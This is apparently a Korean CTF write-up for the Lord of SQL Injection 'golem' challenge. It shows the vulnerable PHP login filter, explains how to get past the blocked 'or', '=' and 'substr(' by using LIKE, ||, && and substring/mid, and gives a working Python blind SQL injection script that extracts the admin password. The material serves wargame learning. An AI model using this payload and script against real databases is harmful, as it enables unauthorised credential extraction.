## Lord of SQL Injection No. 11- golem
## 문제 출제 의도
1. substr함수를 사용 불가한 상황에서 Blind SQL Injection이 가능한지 확인.
2. 대입연산자를 사용 불가한 상황에서 Blind SQL Injection이 가능한지 확인.
## 소스 코드 
~~~ 
<?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    if(preg_match('/or|and|substr\(|=/i', $_GET[pw])) exit("HeHe"); 
    $query = "select id from prob_golem where id='guest' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    $_GET[pw] = addslashes($_GET[pw]); 
    $query = "select pw from prob_golem where id='admin' and pw='{$_GET[pw]}'"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("golem"); 
    highlight_file(__FILE__); 
?>
~~~
## 분석 결론
+ 금지 문자, 문자열
    - Get 방식으로 받은 pw값에 'prob _ . ()중 하나라도 있다면 "No Hack~_~"이 출력되고 문제 풀이에 실패한다.
    - Get 방식으로 받은 pw값에 'or, and , substr( , =중 하나라도 있다면 "HeHe"가 출력되고 문제 풀이에 실패한다.
+ 풀이 성공 조건
    - 입력한 pw와 데이터 베이스에서 받아 온 실제 pw가 같아야 한다.
## 문제 해결
0. 우회 기법
    - mid
        * substring 함수는 다음과 같은 형식을 취한다.
        ~~~
        mid(대상문자열, pos, len)
        ~~~
        * pos번째 문자에서 len 길이 만큼 우측에서 문자열을 반환하는 함수이다. 
    - like
        * like 구문은 다음과 같은 형식을 취한다.
        ~~~
        select * from table_name WHERE column_name LIKE pattern;
        ~~~
        * 대입연산자를 대체 할 수 있다.
1. Blind SQL Injection
    - 다음과 유사한 방법으로 pw값을 알 수 있다.
    ~~~
    import urllib.request
    from urllib.parse import quote

    key = ""
    for i in range(1, 9):
        for j in range(48, 127):
            url = "http://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php?pw="
            data = "' || id like 'admin' && substring(pw,1,{}) like '{}'#".format(str(i), key + chr(j))
            print(data)
            data = quote(data)
            re = urllib.request.Request(url + data)
            re.add_header("User-agent", "Mozilla/5.0") 
            re.add_header("Cookie", "PHPSESSID=6ckrsnfovcd74972o80ugmksb4")
            res = urllib.request.urlopen(re) 
            if str(res.read()).find("Hello admin") != -1:
                key += chr(j).lower()
                print(key)
                break
    print(key)
    ~~~
    - 이를 실행하면 "88e3137f"가 출력된다.
    - 이를 GET 방식으로 입력하면 문제가 해결된다.